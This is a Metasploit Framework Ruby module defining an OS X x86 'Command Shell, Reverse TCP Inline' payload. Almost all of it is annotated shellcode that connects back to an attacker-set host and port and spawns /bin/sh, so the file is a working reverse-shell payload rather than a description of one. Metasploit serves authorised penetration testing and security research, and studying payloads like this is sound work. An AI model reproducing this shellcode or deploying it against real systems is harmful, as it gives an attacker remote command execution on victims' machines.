##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Osx
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'OS X Command Shell, Reverse TCP Inline',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'Ramon de C Valle',
			'License'       => MSF_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShellUnix,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LHOST'    => [ 1, 'ADDR' ],
							'LPORT'    => [ 8, 'n'    ],
						},
					'Payload' =>
						"\x68\x7f\x00\x00\x01" +#   pushl   $0x0100007f                #
						"\x68\xff\x02\x04\xd2" +#   pushl   $0xd20402ff                #
						"\x89\xe7"             +#   movl    %esp,%edi                  #
						"\x31\xc0"             +#   xorl    %eax,%eax                  #
						"\x50"                 +#   pushl   %eax                       #
						"\x6a\x01"             +#   pushl   $0x01                      #
						"\x6a\x02"             +#   pushl   $0x02                      #
						"\x6a\x10"             +#   pushl   $0x10                      #
						"\xb0\x61"             +#   movb    $0x61,%al                  #
						"\xcd\x80"             +#   int     $0x80                      #
						"\x57"                 +#   pushl   %edi                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x6a\x62"             +#   pushl   $0x62                      #
						"\x58"                 +#   popl    %eax                       #
						"\xcd\x80"             +#   int     $0x80                      #
						"\x50"                 +#   pushl   %eax                       #
						"\x6a\x5a"             +#   pushl   $0x5a                      #
						"\x58"                 +#   popl    %eax                       #
						"\xcd\x80"             +#   int     $0x80                      #
						"\xff\x4f\xe8"         +#   decl    -0x18(%edi)                #
						"\x79\xf6"             +#   jns     <cntsockcode+34>           #
						"\x68\x2f\x2f\x73\x68" +#   pushl   $0x68732f2f                #
						"\x68\x2f\x62\x69\x6e" +#   pushl   $0x6e69622f                #
						"\x89\xe3"             +#   movl    %esp,%ebx                  #
						"\x50"                 +#   pushl   %eax                       #
						"\x54"                 +#   pushl   %esp                       #
						"\x54"                 +#   pushl   %esp                       #
						"\x53"                 +#   pushl   %ebx                       #
						"\x50"                 +#   pushl   %eax                       #
						"\xb0\x3b"             +#   movb    $0x3b,%al                  #
						"\xcd\x80"              #   int     $0x80                      #
				}
		))
	end

end
